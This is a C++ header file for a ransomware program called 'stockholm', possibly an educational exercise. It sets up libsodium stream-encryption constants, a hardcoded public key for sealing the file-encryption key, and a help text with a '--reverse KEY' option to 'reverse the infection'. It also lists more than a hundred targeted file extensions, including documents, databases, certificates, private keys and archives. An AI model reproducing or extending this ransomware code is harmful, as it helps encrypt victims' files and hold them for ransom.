#pragma once

#include <string>
#include <vector>
#include <ios>
#include <sodium.h>
#include <sodium/crypto_secretstream_xchacha20poly1305.h>

inline constexpr auto BUFFER_SIZE = 4096;
inline constexpr auto ENCRYPTED_BUFFER_SIZE = 4096 + crypto_secretstream_xchacha20poly1305_ABYTES;
inline constexpr auto SYMMETRIC_KEY_SIZE = crypto_secretbox_KEYBYTES;
inline constexpr auto HEX_SYMMETRIC_KEY_SIZE = SYMMETRIC_KEY_SIZE * 2 + 1;
inline constexpr auto NONCE_SIZE = crypto_secretbox_NONCEBYTES;
inline constexpr auto ASYM_KEY_SIZE = 32;
inline constexpr auto ENCRYPTED_SYM_KEY_SIZE = crypto_box_SEALBYTES + SYMMETRIC_KEY_SIZE;
inline constexpr auto HEADER_SIZE = crypto_secretstream_xchacha20poly1305_HEADERBYTES;
inline constexpr auto STREAM_MAC_SIZE = crypto_secretstream_xchacha20poly1305_ABYTES;
inline constexpr auto TAG_FINAL = crypto_secretstream_xchacha20poly1305_TAG_FINAL; 
inline constexpr auto BIN = std::ios::binary;
inline const std::string TMP_EXT = ".encryptedtmp";
inline const std::string ASYM_KEY_PUB = "8681dd04a8a67ba13c4df7693c3a242a3c08bb48187512096e6c1a3be97f4139";
inline const std::string VERSION = "Version: 1.0";
inline const std::string HELP = R"(
Usage: stockholm [OPTIONS]

Options:
  -h, --help            Show this help message and exit
  -v, --version         Show program version and exit
  -s, --silent          Suppress all output
  -r, --reverse KEY     Reverse the infection using the given KEY (must be at least 16 characters)
)";

inline const std::vector<std::string> VALID_EXT = {
    ".123",
    ".3dm", ".3ds", ".3g2", ".3gp",
    ".602",
    ".ARC", ".PAQ",
    ".accdb", ".aes", ".asc", ".asm", ".asp", ".avi",
    ".bak", ".backup", ".bat", ".bmp", ".brd", ".bz2",
    ".cgm", ".class", ".cmd", ".cpp", ".crt", ".csr", ".csv",
    ".dbf", ".der", ".dif", ".dip", ".djvu", ".dch",
    ".doc", ".docb", ".docm", ".docx", ".dot", ".dotm", ".dotx",
    ".dwg",
    ".edb", ".eml",
    ".fla", ".flv", ".frm", ".ft",
    ".gif", ".gpg",
    ".hwp",
    ".ibd", ".iso",
    ".jar", ".java", ".jpeg", ".jpg", ".jsp",
    ".key",
    ".lay", ".lay6", ".ldf",
    ".max", ".mdb", ".mdf", ".mid", ".mkv", ".mml",
    ".mov", ".mp3", ".mp4", ".mpeg", ".mpg", ".msg",
    ".myd", ".myi",
    ".nef",
    ".odb", ".odg", ".odp", ".ods", ".odt", ".onetoc2",
    ".otg", ".otp", ".ots", ".ott",
    ".pas", ".pdf", ".pem", ".pfx", ".php",
    ".png", ".pot", ".potm", ".potx",
    ".ppam", ".pps", ".ppsm", ".ppsx",
    ".ppt", ".pptm", ".pptx",
    ".ps1", ".psd", ".pst",
    ".raw", ".rar", ".rtf",
    ".sch", ".sldm", ".sldx", ".slk", ".sln",
    ".sql", ".sqlite3", ".sqlitedb",
    ".std", ".sti", ".stw", ".suo", ".svg",
    ".sxc", ".sxd", ".sxi", ".sxm", ".snt",
    ".tar", ".tbk", ".tgz", ".tif", ".tiff", ".txt",
    ".uot",
    ".vbs", ".vcd", ".vdi", ".vmx", ".vmdk",
    ".vsd", ".vsdx", ".vob",
    ".wav", ".wb2", ".wks", ".wk1", ".wmv",
    ".xls", ".xlsb", ".xlsm", ".xlsx",
    ".xlc", ".xlm", ".xlt", ".xltm", ".xltx", ".xlw",
    ".zip"
};

